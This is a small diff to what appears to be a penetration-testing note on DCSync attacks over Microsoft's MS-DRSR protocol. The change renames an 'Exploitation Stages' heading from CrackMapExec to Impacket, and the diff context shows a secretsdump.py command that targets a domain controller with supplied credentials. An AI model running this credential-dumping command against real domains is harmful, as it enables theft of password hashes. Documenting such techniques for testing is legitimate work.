@@ -17,7 +17,7 @@ Protokol [Directory Replication Service (MS-DRSR)](https://learn.microsoft.com/e
 
 ## 0x1 - Exploitation Stages
 
-### A. CrackMapExec
+### A. Impacket
 
 ```bash
 ➜ secretsdump.py <domain>/<username>:<password>@<ip-dc>
